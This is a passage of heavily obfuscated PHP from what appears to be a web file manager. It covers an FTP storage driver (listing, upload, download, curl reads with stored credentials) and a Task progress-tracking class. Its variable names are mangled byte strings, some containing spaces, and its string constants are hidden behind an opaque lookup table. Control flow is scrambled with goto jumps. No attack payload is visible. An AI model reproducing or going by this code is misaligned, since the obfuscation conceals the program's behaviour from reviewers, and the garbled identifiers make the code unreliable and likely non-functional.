$this->getPathOuter($A·İï İ¹[8] . $bŸœµ«®), $A·İï İ¹[29] => $A·İï İ¹[76]); if ($e»¢Æ–ô¡) { return $d›Ñ°öõ„á; } $d›Ñ°öõ„á[$A·İï İ¹[192]] = $d›Ñ°öõ„á[$A·İï İ¹[83]] = 0; $d›Ñ°öõ„á[$A·İï İ¹[193]] = $d›Ñ°öõ„á[$A·İï İ¹[194]] = !0; return $d›Ñ°öõ„á; } private function fileInfo($aºÉ–Ã†ù„, $A©ù©Í–ë = false, $dë‘Œ™†Á‡ = array()) { goto AÃ±ƒ·¯É ; AÃ±ƒ·¯É : $dÎ­æÈË– =& $_SERVER[¢ÌÛ]; $DŠ¸ù³ï× = array($dÎ­æÈË–[28] => $this->pathThis($aºÉ–Ã†ù„), $dÎ­æÈË–[75] => $this->getPathOuter($dÎ­æÈË–[8] . $aºÉ–Ã†ù„), $dÎ­æÈË–[29] => $dÎ­æÈË–[173], $dÎ­æÈË–[77] => isset($dë‘Œ™†Á‡[$dÎ­æÈË–[77]]) ? $dë‘Œ™†Á‡[$dÎ­æÈË–[77]] : 0, $dÎ­æÈË–[167] => $this->ext($aºÉ–Ã†ù„)); if ($A©ù©Í–ë) { return $DŠ¸ù³ï×; } goto cÂ’È”šÛº; cÂ’È”šÛº: $DŠ¸ù³ï×[$dÎ­æÈË–[192]] = $DŠ¸ù³ï×[$dÎ­æÈË–[83]] = 0; $DŠ¸ù³ï×[$dÎ­æÈË–[193]] = $DŠ¸ù³ï×[$dÎ­æÈË–[194]] = !0; $fÖ‚´ğˆøì = $this->iconvSystem($aºÉ–Ã†ù„); goto aŞ’ÛÂêËœ; aŞ’ÛÂêËœ: $DŠ¸ù³ï×[$dÎ­æÈË–[83]] = @ftp_mdtm($this->connect, $fÖ‚´ğˆøì); if (empty($dë‘Œ™†Á‡)) { $dë‘Œ™†Á‡ = $this->objectMeta($aºÉ–Ã†ù„); if (!$dë‘Œ™†Á‡) { return $DŠ¸ù³ï×; } } $DŠ¸ù³ï×[$dÎ­æÈË–[77]] = $dë‘Œ™†Á‡[$dÎ­æÈË–[77]]; goto aÈ¨©ßó¿; aÈ¨©ßó¿: return $DŠ¸ù³ï×; goto d…“ËÈ‹¦Ø; d…“ËÈ‹¦Ø: } public function size($E‰¤¹É‡á©) { $e¿Î–ÍƒÄ„ = $this->objectMeta($E‰¤¹É‡á©); return $e¿Î–ÍƒÄ„ ? $e¿Î–ÍƒÄ„[$_SERVER[¢ÌÛ][77]] : 0; } public function info($BÎĞ™ µŸ¸) { if ($this->isFile($BÎĞ™ µŸ¸)) { return $this->fileInfo($BÎĞ™ µŸ¸, 0); } else { if ($this->isFolder($BÎĞ™ µŸ¸)) { return $this->folderInfo($BÎĞ™ µŸ¸); } } return !1; } private function fileList($bÈÙŠˆï¸ç, &$aäÂ•’š±¬, &$dí‹††—ó, $AÅ¿¨İ¼™ = false) { goto fªœ“·ÇÆí; fªœ“·ÇÆí: $cÇÌ‹œíö§ =& $_SERVER[¢ÌÛ]; $bÈÙŠˆï¸ç = $this->iconvSystem($bÈÙŠˆï¸ç); if (!$this->isFolder($bÈÙŠˆï¸ç)) { return !1; } goto aœãÇ·¯; Dì†º„÷«–: $a„¿ŠÎòÔ = array($cÇÌ‹œíö§[94] => 1, $cÇÌ‹œíö§[1223] => 1); foreach ($EÎ™„Ê‡àØ as $D‰Ö—åÀõ) { goto E…ÔÕÇá³È; B””–îŞ•’: if ($eëÖ¨â±‚) { $aäÂ•’š±¬[] = $d«¸éâ²Óñ; if ($AÅ¿¨İ¼™) { $this->fileList($d«¸éâ²Óñ, $aäÂ•’š±¬, $dí‹††—ó, $AÅ¿¨İ¼™); } continue; } $dí‹††—ó[] = $fœªÃ¥åå; goto a®´¾Åô‘ë; AÜ„Çá—ËÎ: if (substr($D‰Ö—åÀõ, 0, 1) == $cÇÌ‹œíö§[1224]) { $fœªÃ¥åå[$cÇÌ‹œíö§[29]] = $cÇÌ‹œíö§[76]; $fœªÃ¥åå[$cÇÌ‹œíö§[77]] = 0; } $eëÖ¨â±‚ = $fœªÃ¥åå[$cÇÌ‹œíö§[29]] == $cÇÌ‹œíö§[76] ? !0 : !1; if ($C‘  ‚¢ˆ) { $this->cacheMethod($cÇÌ‹œíö§[197], $d«¸éâ²Óñ, $eëÖ¨â±‚); $this->cacheMethod($cÇÌ‹œíö§[198], $d«¸éâ²Óñ, $fœªÃ¥åå); } goto B””–îŞ•’; E…ÔÕÇá³È: $d¯æš‰ôƒë = $this->_listItem($D‰Ö—åÀõ); if ($d¯æš‰ôƒë[0] == $cÇÌ‹œíö§[718]) { continue; } $d«¸éâ²Óñ = $d¯æš‰ôƒë[8]; goto f‡ˆÁï‘ë; f‡ˆÁï‘ë: if (!$d«¸éâ²Óñ || isset($a„¿ŠÎòÔ[$d«¸éâ²Óñ])) { continue; } $d«¸éâ²Óñ = $this->iconvApp($bÈÙŠˆï¸ç . ltrim($d«¸éâ²Óñ, $cÇÌ‹œíö§[8])); $fœªÃ¥åå = array($cÇÌ‹œíö§[28] => $d«¸éâ²Óñ, $cÇÌ‹œíö§[29] => $cÇÌ‹œíö§[173], $cÇÌ‹œíö§[77] => $d¯æš‰ôƒë[4]); goto AÜ„Çá—ËÎ; a®´¾Åô‘ë: } if ($C‘  ‚¢ˆ) { $this->cacheMethod($cÇÌ‹œíö§[197], $bÈÙŠˆï¸ç, !0); } goto Câãí–óò­; aœãÇ·¯: @ftp_chdir($this->connect, $cÇÌ‹œíö§[8]); $bÈÙŠˆï¸ç = rtrim($bÈÙŠˆï¸ç, $cÇÌ‹œíö§[8]) . $cÇÌ‹œíö§[8]; check_abort(); goto c µ¦ª›¾à; c µ¦ª›¾à: $C‘  ‚¢ˆ = $this->listItemCache === !1 ? !1 : !0; $EÎ™„Ê‡àØ = @ftp_rawlist($this->connect, $bÈÙŠˆï¸ç); if (!$EÎ™„Ê‡àØ) { $EÎ™„Ê‡àØ = array(); } goto Dì†º„÷«–; Câãí–óò­: } private function _listItem($c˜óåì‹Óõ) { if (empty($c˜óåì‹Óõ)) { return array(); } $fîïùØ† = preg_split($_SERVER[¢ÌÛ][1225], $c˜óåì‹Óõ); if (count($fîïùØ†) <= 9) { return $fîïùØ†; } $fîïùØ†[8] = trim(substr($c˜óåì‹Óõ, strpos($c˜óåì‹Óõ, $fîïùØ†[7]) + strlen($fîïùØ†[7]))); return array_splice($fîïùØ†, 0, 9); } public function listPath($fà˜¤ä·ÜÀ, $eÖÔ×íÙ¶Ş = false) { goto bÈ¯¬ÊåŸ; bÈ¯¬ÊåŸ: $eù÷é±Ùàá =& $_SERVER[¢ÌÛ]; if (!$this->_isconn()) { return !1; } $B·…ÕÈÓÕß = $Eöº÷ˆ…è = array(); goto fİ’Òƒ†”˜; aæÅŒô¼ ¥: return array($eù÷é±Ùàá[74] => $B·…ÕÈÓÕß, $eù÷é±Ùàá[73] => $Eöº÷ˆ…è); goto A¬‡ç‘õ„Ö; fİ’Òƒ†”˜: $this->fileList($fà˜¤ä·ÜÀ, $B·…ÕÈÓÕß, $Eöº÷ˆ…è); foreach ($B·…ÕÈÓÕß as $Dó‡ÇœíŸ => $f‚©Û±¼š¾) { $B·…ÕÈÓÕß[$Dó‡ÇœíŸ] = $this->folderInfo($f‚©Û±¼š¾, $eÖÔ×íÙ¶Ş); } foreach ($Eöº÷ˆ…è as $Dó‡ÇœíŸ => $f‚©Û±¼š¾) { $Eöº÷ˆ…è[$Dó‡ÇœíŸ] = $this->fileInfo($f‚©Û±¼š¾[$eù÷é±Ùàá[28]], $eÖÔ×íÙ¶Ş, $f‚©Û±¼š¾); } goto aæÅŒô¼ ¥; A¬‡ç‘õ„Ö: } public function has($Bµñãë¨ÕÖ, $Aø•¨ŸõóÕ = false, $F‹ÁìÚÖé = true) { goto B„É§¾Ê®; B„É§¾Ê®: $Dêƒî„’å§ =& $_SERVER[¢ÌÛ]; $D°õÊÎÀ¦Ê = $AÊïŠœÅ³» = array(); $Eìí­è…£± = $Aø•¨ŸõóÕ ? !0 : !1; goto c©ƒŒò‘ä; c©ƒŒò‘ä: $this->fileList($Bµñãë¨ÕÖ, $D°õÊÎÀ¦Ê, $AÊïŠœÅ³», $Eìí­è…£±); if ($Aø•¨ŸõóÕ) { return array($Dêƒî„’å§[201] => count($AÊïŠœÅ³»), $Dêƒî„’å§[202] => count($D°õÊÎÀ¦Ê)); } if ($F‹ÁìÚÖé) { if (count($AÊïŠœÅ³»)) { return !0; } } else { if (count($D°õÊÎÀ¦Ê)) { return !0; } } goto cóÉ‡‘øëÜ; cóÉ‡‘øëÜ: return !1; goto A®ãäÙÉ; A®ãäÙÉ: } public function listAll($b÷®ÁŠ½°) { goto E©ˆ—„•ƒ¥; B˜¶Ö©¹: $this->fileList($b÷®ÁŠ½°, $Cğ‡¦¶ŞÃ¬, $E¶ó¸Ã ë”, !0); $Dó®×ˆ“Ï = array(); foreach ($E¶ó¸Ã ë” as $c½¨™èŠ¤ˆ) { $Dó®×ˆ“Ï[$c½¨™èŠ¤ˆ[$FŞºŠÅ½­ª[28]]] = $c½¨™èŠ¤ˆ[$FŞºŠÅ½­ª[77]]; } goto B¨¤¼ê¾—; B¨¤¼ê¾—: foreach ($Cğ‡¦¶ŞÃ¬ as $c½¨™èŠ¤ˆ) { if (is_string($c½¨™èŠ¤ˆ)) { $Dó®×ˆ“Ï[$c½¨™èŠ¤ˆ] = 0; } } return $this->listAllFiles($b÷®ÁŠ½°, array_keys($Dó®×ˆ“Ï), $Dó®×ˆ“Ï); goto cíô°Şğ¢Í; E©ˆ—„•ƒ¥: $FŞºŠÅ½­ª =& $_SERVER[¢ÌÛ]; if (!$this->_isconn()) { return !1; } $Cğ‡¦¶ŞÃ¬ = $E¶ó¸Ã ë” = array(); goto B˜¶Ö©¹; cíô°Şğ¢Í: } public function getContent($A¶ğ“Ğñ) { if (!$this->_isconn()) { return !1; } $A¶ğ“Ğñ = $this->iconvSystem($A¶ğ“Ğñ); return $this->fileSubstr($A¶ğ“Ğñ); } public function setContent($aØö£âÉ‰Ã, $b¦¦‚Ü®À® = '') { goto FÊ…”¶ËÔß; BêğÌäÖóË: return $Cì®·ÜÅŞ¬; goto cÆøŒ”âé; dŠ³öÓìÊš: file_put_contents($B Èô‘Éª, $b¦¦‚Ü®À®); $Cì®·ÜÅŞ¬ = $this->upload($aØö£âÉ‰Ã, $this->iconvApp($B Èô‘Éª)); $this->tempFileRemve($B Èô‘Éª); goto BêğÌäÖóË; FÊ…”¶ËÔß: if (!$this->_isconn()) { return !1; } $eÇöª®ìá = $this->pathThis($this->iconvSystem($aØö£âÉ‰Ã)); $B Èô‘Éª = $this->tempFile($eÇöª®ìá); goto dŠ³öÓìÊš; cÆøŒ”âé: } public function fileSubstr($Dî¹ÄÌ…››, $c»–Ë”À¤š = 0, $c‚êÜÊ·• = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Dî¹ÄÌ…››, $c»–Ë”À¤š, $c‚êÜÊ·•); } private function ftpRequest($EÛ™â„ÇÁ», $Aè¶¤ù© = 0, $C¸í¦‚›·… = false) { goto c‚ÓŠÁÎ; B¼‚˜¬¬±Ö: curl_setopt($DøØÆé´®Ü, CURLOPT_URL, $D»½Õ²¢ˆ . $this->pathEncode($EÛ™â„ÇÁ»)); curl_setopt($DøØÆé´®Ü, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($C¸í¦‚›·…) { $AÍöá‰¢²ò = $Aè¶¤ù© + $C¸í¦‚›·… - 1; curl_setopt($DøØÆé´®Ü, CURLOPT_RANGE, "{$Aè¶¤ù©}\55{$AÍöá‰¢²ò}"); } goto DÓÔĞùá¯—; DÓÔĞùá¯—: curl_setopt($DøØÆé´®Ü, CURLOPT_RETURNTRANSFER, 1); $e›ô‰Ôöö¯ = curl_exec($DøØÆé´®Ü); curl_close($DøØÆé´®Ü); goto B†í‹ä; c‚ÓŠÁÎ: $EÛ™â„ÇÁ» = $this->iconvSystem($EÛ™â„ÇÁ»); $D»½Õ²¢ˆ = $this->scheme . $this->host . $_SERVER[¢ÌÛ][4] . $this->port; $DøØÆé´®Ü = curl_init(); goto B¼‚˜¬¬±Ö; B†í‹ä: return $e›ô‰Ôöö¯; goto FŒ˜¨Ÿ¸‰„; FŒ˜¨Ÿ¸‰„: } public function upload($aš—¦…¼, $aß¡‡óÄĞ­, $bè†«Í–ƒ­ = false, $a®Ã®””ª¯ = REPEAT_REPLACE) { goto A˜ß´¥˜Ì¯; BïË“¶•£: $aß¡‡óÄĞ­ = $this->iconvSystem($aß¡‡óÄĞ­); $Cœƒˆ ÇÎ‹ = ftp_nb_put($this->connect, $aš—¦…¼, $aß¡‡óÄĞ­, FTP_BINARY); while ($Cœƒˆ ÇÎ‹ == FTP_MOREDATA) { $Cœƒˆ ÇÎ‹ = ftp_nb_continue($this->connect); } goto Fí††µ¯ö™; A˜ß´¥˜Ì¯: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aš—¦…¼))) { return !1; } $aš—¦…¼ = $this->iconvSystem($aš—¦…¼); goto BïË“¶•£; Fí††µ¯ö™: if ($Cœƒˆ ÇÎ‹ != FTP_FINISHED) { return !1; } return $this->getPathOuter($aš—¦…¼); goto e‹‚Í«£Ë; e‹‚Í«£Ë: } public function download($F¢¶‡ØÌö, $BÌí±Ì„ÏÒ = '') { goto c²í›™æ; a¬ô™˜î¢”: while ($ağ°¶ÔµšÀ == FTP_MOREDATA) { $ağ°¶ÔµšÀ = ftp_nb_continue($this->connect); } if ($ağ°¶ÔµšÀ != FTP_FINISHED) { return !1; } return $this->iconvApp($BÌí±Ì„ÏÒ); goto d¶‹¿‹ÈÕ‡; f®…¥ùÌô»: $F¢¶‡ØÌö = $this->iconvSystem($F¢¶‡ØÌö); $BÌí±Ì„ÏÒ = $this->iconvSystem($BÌí±Ì„ÏÒ); $ağ°¶ÔµšÀ = ftp_nb_get($this->connect, $BÌí±Ì„ÏÒ, $F¢¶‡ØÌö, FTP_BINARY); goto a¬ô™˜î¢”; c²í›™æ: if (!$this->_isconn()) { return !1; } $d¤İÓ‘ËÁ = $this->pathFather($BÌí±Ì„ÏÒ); if (!IO::mkdir($d¤İÓ‘ËÁ)) { return !1; } goto f®…¥ùÌô»; d¶‹¿‹ÈÕ‡: } public function exist($CÙŒ£ƒÑ×¥) { return $this->isFile($CÙŒ£ƒÑ×¥) || $this->isFolder($CÙŒ£ƒÑ×¥); } public function isFile($e¶Èí¿Ùø») { return !$this->isFolder($e¶Èí¿Ùø») && $this->objectMeta($e¶Èí¿Ùø»); } public function isFolder($dÌƒÑ¤ëÉÌ) { return $this->cacheMethod($_SERVER[¢ÌÛ][197], $dÌƒÑ¤ëÉÌ); } protected function objectMeta($A‡ï‰ñ„˜) { return $this->cacheMethod($_SERVER[¢ÌÛ][198], $A‡ï‰ñ„˜); } protected function _objectMeta($dÍÉó„ø¸Ô) { goto FùàË‹‘ÓÊ; E«Ô¤Ù£”à: $FÚ¦ÆÕµùë = @ftp_size($this->connect, $dÍÉó„ø¸Ô); if ($FÚ¦ÆÕµùë != -1) { $cĞÍ¨ÔÓ´Š[$c¤®œ¬½…À[77]] = $FÚ¦ÆÕµùë; } else { $EÂÆÑÙ¨® = @ftp_chdir($this->connect, $dÍÉó„ø¸Ô); if (!$EÂÆÑÙ¨®) { return !1; } $cĞÍ¨ÔÓ´Š[$c¤®œ¬½…À[29]] = $c¤®œ¬½…À[76]; } return $cĞÍ¨ÔÓ´Š; goto DèÒùÌÁ…¹; bß²¹àÒ¶½: $dÍÉó„ø¸Ô = $this->iconvSystem($dÍÉó„ø¸Ô); $cĞÍ¨ÔÓ´Š = array($c¤®œ¬½…À[28] => $this->iconvApp($dÍÉó„ø¸Ô), $c¤®œ¬½…À[29] => $c¤®œ¬½…À[173], $c¤®œ¬½…À[77] => 0); @ftp_chdir($this->connect, $c¤®œ¬½…À[8]); goto E«Ô¤Ù£”à; FùàË‹‘ÓÊ: $c¤®œ¬½…À =& $_SERVER[¢ÌÛ]; if ($dÍÉó„ø¸Ô == $c¤®œ¬½…À[33] || $dÍÉó„ø¸Ô == $c¤®œ¬½…À[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto bß²¹àÒ¶½; DèÒùÌÁ…¹: } protected function _isFolder($Cóâ”„Ÿµ¤) { $b•ŠÖµßõÕ =& $_SERVER[¢ÌÛ]; if ($Cóâ”„Ÿµ¤ == $b•ŠÖµßõÕ[33] || $Cóâ”„Ÿµ¤ == $b•ŠÖµßõÕ[8]) { return !0; } $Cä¥È˜ÚÃ‚ = $this->_objectMeta($Cóâ”„Ÿµ¤); return isset($Cä¥È˜ÚÃ‚[$b•ŠÖµßõÕ[29]]) && $Cä¥È˜ÚÃ‚[$b•ŠÖµßõÕ[29]] == $b•ŠÖµßõÕ[76] ? !0 : !1; } } goto b‘†Şê†ÆÍ; B„˜­§ÂŞŒ: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($bà¾­šÛ¾Š, $e•œã¢Áñ = '', $Bï–÷÷Â ™ = 0, $eïË‚ÔŞö = '') { goto fÖª¨™Û‰; fÖª¨™Û‰: $F¢¸¸„íÏ =& $_SERVER[¢ÌÛ]; if (self::get($bà¾­šÛ¾Š)) { return; } $this->task = array($F¢¸¸„íÏ[385] => $bà¾­šÛ¾Š, $F¢¸¸„íÏ[1498] => USER_ID, $F¢¸¸„íÏ[1403] => $eïË‚ÔŞö, $F¢¸¸„íÏ[29] => $e•œã¢Áñ, $F¢¸¸„íÏ[1000] => $F¢¸¸„íÏ[33], $F¢¸¸„íÏ[998] => $Bï–÷÷Â ™, $F¢¸¸„íÏ[1012] => 0, $F¢¸¸„íÏ[1499] => 0, $F¢¸¸„íÏ[1500] => 0, $F¢¸¸„íÏ[1501] => timeFloat(), $F¢¸¸„íÏ[1502] => 0, $F¢¸¸„íÏ[1503] => 0, $F¢¸¸„íÏ[1504] => 0, $F¢¸¸„íÏ[1505] => 0, $F¢¸¸„íÏ[712] => $F¢¸¸„íÏ[1461]); goto fÎ¶İÑàìÇ; DÉàğ³«ö´: $this->startAfter(); Hook::trigger($F¢¸¸„íÏ[1510], $this->task); $this->task[$F¢¸¸„íÏ[1503]] = timeFloat(); goto Fï¹”›Ô…Œ; fÎ¶İÑàìÇ: $GLOBALS[$F¢¸¸„íÏ[1506]] = 1; Hook::bind($F¢¸¸„íÏ[1463], array($this, $F¢¸¸„íÏ[1507])); Hook::bind($F¢¸¸„íÏ[1508], array($this, $F¢¸¸„íÏ[1509])); goto DÉàğ³«ö´; Fï¹”›Ô…Œ: } public function end() { goto AÚà˜ÓàÚÁ; bó¼¼‚ø¸ó: Hook::unbind($Dƒ£ŠİÈïã[1508], array($this, $Dƒ£ŠİÈïã[1509])); $this->endAfter(); $this->task = !1; goto d×²†ƒâ¡˜; AÚà˜ÓàÚÁ: $Dƒ£ŠİÈïã =& $_SERVER[¢ÌÛ]; if (!$this->task) { return; } if ($this->task[$Dƒ£ŠİÈïã[1503]]) { self::valueSet($this->task[$Dƒ£ŠİÈïã[385]], !1); } goto Bï×İ¯ö„; Bï×İ¯ö„: $b„ˆ¾‚‹‹– = timeFloat() - $this->task[$Dƒ£ŠİÈïã[1501]]; self::log($Dƒ£ŠİÈïã[1511] . $this->task[$Dƒ£ŠİÈïã[385]] . $Dƒ£ŠİÈïã[1512] . $b„ˆ¾‚‹‹– . $Dƒ£ŠİÈïã[1513]); Hook::unbind($Dƒ£ŠİÈïã[1463], array($this, $Dƒ£ŠİÈïã[1507])); goto bó¼¼‚ø¸ó; d×²†ƒâ¡˜: } public function update($cµ·›Ÿ¢…ø = 0, $Dâá¦ ŞÅÒ = false) { goto F™ÓÄÛóè; fßŸšÊ°ˆ¡: $AÊõ”À¾[$d‹…è¿Ï©°[712]] = $D¢â³Š•²µ ? $D¢â³Š•²µ : $AÊõ”À¾[$d‹…è¿Ï©°[712]]; $AÊõ”À¾[$d‹…è¿Ï©°[1504]] = $D¶ˆ‰•ÈØÚ[$d‹…è¿Ï©°[1504]] ? $D¶ˆ‰•ÈØÚ[$d‹…è¿Ï©°[1504]] : 0; $AÊõ”À¾[$d‹…è¿Ï©°[1503]] = timeFloat(); goto dÏÃã¦ŠËµ; bÔöÒ³Ë¹’: $AÊõ”À¾[$d‹…è¿Ï©°[1012]] += $cµ·›Ÿ¢…ø; $AÊõ”À¾[$d‹…è¿Ï©°[1502]] = timeFloat(); if ($AÊõ”À¾[$d‹…è¿Ï©°[998]]) { if ($AÊõ”À¾[$d‹…è¿Ï©°[998]] < $AÊõ”À¾[$d‹…è¿Ï©°[1012]]) { $AÊõ”À¾[$d‹…è¿Ï©°[998]] = $AÊõ”À¾[$d‹…è¿Ï©°[1012]]; } $Fˆ½–ôÙ°ò = timeFloat() - $AÊõ”À¾[$d‹…è¿Ï©°[1501]] - $AÊõ”À¾[$d‹…è¿Ï©°[1504]]; $AÊõ”À¾[$d‹…è¿Ï©°[1499]] = $AÊõ”À¾[$d‹…è¿Ï©°[1012]] / $AÊõ”À¾[$d‹…è¿Ï©°[998]]; $AÊõ”À¾[$d‹…è¿Ï©°[1500]] = $AÊõ”À¾[$d‹…è¿Ï©°[1012]] / $Fˆ½–ôÙ°ò; if ($AÊõ”À¾[$d‹…è¿Ï©°[1499]] > 0) { $AÊõ”À¾[$d‹…è¿Ï©°[1505]] = $Fˆ½–ôÙ°ò * (1 - $AÊõ”À¾[$d‹…è¿Ï©°[1499]]) / $AÊõ”À¾[$d‹…è¿Ï©°[1499]]; } $AÊõ”À¾[$d‹…è¿Ï©°[1505]] = $AÊõ”À¾[$d‹…è¿Ï©°[1505]] <= 0 ? 0 : $AÊõ”À¾[$d‹…è¿Ï©°[1505]]; } goto BìÇ”ğÍÙÄ; BìÇ”ğÍÙÄ: $this->updateAfter(); $bŒŸÜÊÜŒ³ = 0.2; if (timeFloat() - $AÊõ”À¾[$d‹…è¿Ï©°[1503]] < $bŒŸÜÊÜŒ³ && !$Dâá¦ ŞÅÒ) { return; } goto a“ˆõŒÑ°; dÏÃã¦ŠËµ: Hook::trigger($d‹…è¿Ï©°[1517], $AÊõ”À¾); self::valueSet($AÊõ”À¾[$d‹…è¿Ï©°[385]], $AÊõ”À¾); goto BÂÍ²¢ïôÌ; F™ÓÄÛóè: $d‹…è¿Ï©° =& $_SERVER[¢ÌÛ]; $AÊõ”À¾ =& $this->task; if (!$AÊõ”À¾) { return; } goto bÔöÒ³Ë¹’; a“ˆõŒÑ°: $D¶ˆ‰•ÈØÚ = self::get($AÊõ”À¾[$d‹…è¿Ï©°[385]]); $D¢â³Š•²µ = $D¶ˆ‰•ÈØÚ[$d‹…è¿Ï©°[712]]; if ($D¢â³Š•²µ == self::STATYS_KILL) { $C¿ò˜éŠí© = array($d‹…è¿Ï©°[1514] => LNG($d‹…è¿Ï©°[1515]), $d‹…è¿Ï©°[1062] => !1); Cache::set($d‹…è¿Ï©°[1516] . $this->task[$d‹…è¿Ï©°[385]], $C¿ò˜éŠí©, 30); $this->end(); die; } else { if ($D¢â³Š•²µ == self::STATYS_STOP) { $d‡å‹àÙÛ = 2; $D¶ˆ‰•ÈØÚ[$d‹…è¿Ï©°[1504]] += $d‡å‹àÙÛ; self::valueSet($AÊõ”À¾[$d‹…è¿Ï©°[385]], $D¶ˆ‰•ÈØÚ); sleep($d‡å‹àÙÛ); $this->update(); return; } } goto fßŸšÊ°ˆ¡; BÂÍ²¢ïôÌ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($E©Š‘´ÙƒÍ) { $bÈ²®¢ª×‹ =& $_SERVER[¢ÌÛ]; Cache::set($bÈ²®¢ª×‹[1516] . $this->task[$bÈ²®¢ª×‹[385]], $E©Š‘´ÙƒÍ, 60); return $E©Š‘´ÙƒÍ; } public static function get($DË£òÑÉ›) { return self::valueGet($DË£òÑÉ›); } public static function listData() { $A™•Ê´Ê¹ = self::valueGet(); return array_sort_by($A™•Ê´Ê¹, $_SERVER[¢ÌÛ][1501], !0); } public static function kill($cÜîñ»ó¡á) { return self::changeStatus($cÜîñ»ó¡á, self::STATYS_KILL); } public static function stop($a†™ª…¥¬ä) { return self::changeStatus($a†™ª…¥¬ä, self::STATYS_STOP); } public static function restart($BƒÇæ¢³Š) { return self::changeStatus($BƒÇæ¢³Š, self::STATYS_RUNNING); } public static function killAll() { $DÌ£œÑÁ›í =& $_SERVER[¢ÌÛ]; $D­ÀãÈ¸… = self::listData(); foreach ($D­ÀãÈ¸… as $c™ «‹ğÜ») { self::kill($c™ «‹ğÜ»[$DÌ£œÑÁ›í[385]]); } sleep(2); foreach ($D­ÀãÈ¸… as $c™ «‹ğÜ») { self::valueSet($c™ «‹ğÜ»[$DÌ£œÑÁ›í[385]], !1); } } private static function changeStatus($Bó·š…¨¬—, $F‡‚‰ß©½ó) { goto BšÙÍğ¢Èè; eÌÈ¶½²¢Ó: return !0; goto aœš·½ğ; B‚Ö£ğ½Å·: $CÔÌ×‚™[$a¬®„Ÿ›Å‹[712]] = $F‡‚‰ß©½ó; self::valueSet($Bó·š…¨¬—, $CÔÌ×‚™); self::log($a¬®„Ÿ›Å‹[1518] . $CÔÌ×‚™[$a¬®„Ÿ›Å‹[385]] . $a¬®„Ÿ›Å‹[1519] . $F‡‚‰ß©½ó); goto eÌÈ¶½²¢Ó; BšÙÍğ¢Èè: $a¬®„Ÿ›Å‹ =& $_SERVER[¢ÌÛ]; $CÔÌ×‚™ = self::valueGet($Bó·š…¨¬—); if (!$CÔÌ×‚™) { return !1; } goto B‚Ö£ğ½Å·; aœš·½ğ: } public static function valueGet($dòÑ›Î¨Ñç = false) { $C–§ãÃåÜù =& $_SERVER[¢ÌÛ]; if ($dòÑ›Î¨Ñç) { $cÚ™¤õ½À× = Model($C–§ãÃåÜù[425])->where(array($C–§ãÃåÜù[92] => $dòÑ›Î¨Ñç, $C–§ãÃåÜù[29] => $C–§ãÃåÜù[1520]))->find(); return $cÚ™¤õ½À× ? json_decode($cÚ™¤õ½À×[$C–§ãÃåÜù[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Dæø‰äĞ¬µ = false) { goto c‰‰İ´à¶; c‰‰İ´à¶: $C™©æŠ¶™ =& $_SERVER[¢ÌÛ]; $eç°–àš‘† = array($C™©æŠ¶™[29] => $C™©æŠ¶™[1520]); if ($Dæø‰äĞ¬µ) { $eç°–àš‘†[$C™©æŠ¶™[1498]] = $Dæø‰äĞ¬µ; } goto c¢Ö ™Ø®; eÕ…¿Ñ’µ: return $có™š£ˆø»; goto Bö…¨…ßŸ; c¢Ö ™Ø®: $có™š£ˆø» = Model($C™©æŠ¶™[425])->where($eç°–àš‘†)->select(); $có™š£ˆø» = $có™š£ˆø» ? $có™š£ˆø» : array(); foreach ($có™š£ˆø» as $B«‰ ¯ÉÄÀ => $Câ®ƒ¯«„Ö) { $có™š£ˆø»[$B«‰ ¯ÉÄÀ] = json_decode($Câ®ƒ¯«„Ö[$C™©æŠ¶™[368]], !0); } goto eÕ…¿Ñ’µ; Bö…¨…ßŸ: } public static function valueSet($a”ïİ§‰­, $bÂï¬¦ö‡ß) { goto Bˆ¸ƒÆ–‚¯; aˆõË¤ô¦Ï: Model($Aª‰«Ôà[425])->add($Bèõİ°³·Ú, array(), !0); goto EÕøˆßó•…; Bˆ¸ƒÆ–‚¯: $Aª‰«Ôà =& $_SERVER[¢ÌÛ]; if (!$bÂï¬¦ö‡ß) { return Model($Aª‰«Ôà[425])->where(array($Aª‰«Ôà[92] => $a”ïİ§‰­, $Aª‰«Ôà[29] => $Aª‰«Ôà[1520]))->delete(); } $bÏœ×–Ëµ = json_encode($bÂï¬¦ö‡ß); goto a“ŠÒŒóô¨; a“ŠÒŒóô¨: if (!$bÏœ×–Ëµ) { ob_start(); var_dump($bÂï¬¦ö‡ß); $F”»î‡±œ = ob_get_clean(); self::log($Aª‰«Ôà[1521] . json_encode_force($F”»î‡±œ)); } if (!$a”ïİ§‰­ || !$bÂï¬¦ö‡ß[$Aª‰«Ôà[385]]) { return !1; } $Bèõİ°³·Ú = array($Aª‰«Ôà[29] => $Aª‰«Ôà[1520], $Aª‰«Ôà[1498] => USER_ID, $Aª‰«Ôà[92] => $a”ïİ§‰­, $Aª‰«Ôà[368] => $bÏœ×–Ëµ); goto aˆõË¤ô¦Ï; EÕøˆßó•…: } public static function log($DèÃ® šâ) { write_log($DèÃ® šâ, $_SERVER[¢ÌÛ][1522]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto C™Ëñ ÂÂÚ; cÀ¸õºñÇœ: Hook::bind($B“ÁÊÑËª[537], array($this, $B“ÁÊÑËª[1531])); Hook::bind($B“ÁÊÑËª[539], array($this, $B“ÁÊÑËª[1531])); Hook::bind($B“ÁÊÑËª[541], array($this, $B“ÁÊÑËª[1531])); goto d‹©Ç‘ÅÌ¶; F¢Ó®è‰´: Hook::bind($B“ÁÊÑËª[1535], array($this, $B“ÁÊÑËª[1536])); Hook::bind($B“ÁÊÑËª[1537], array($this, $B“ÁÊÑËª[1538])); Hook::bind($B“ÁÊÑËª[1539], array($this, $B“ÁÊÑËª[1540])); goto aÍé¢áõÌÉ; d‚Æ¬İ—âÃ: Hook::bind($B“ÁÊÑËª[568], array($this, $B“ÁÊÑËª[1530])); Hook::bind($B“ÁÊÑËª[535], array($this, $B“ÁÊÑËª[1531])); Hook::bind($B“ÁÊÑËª[532], array($this, $B“ÁÊÑËª[1531])); goto 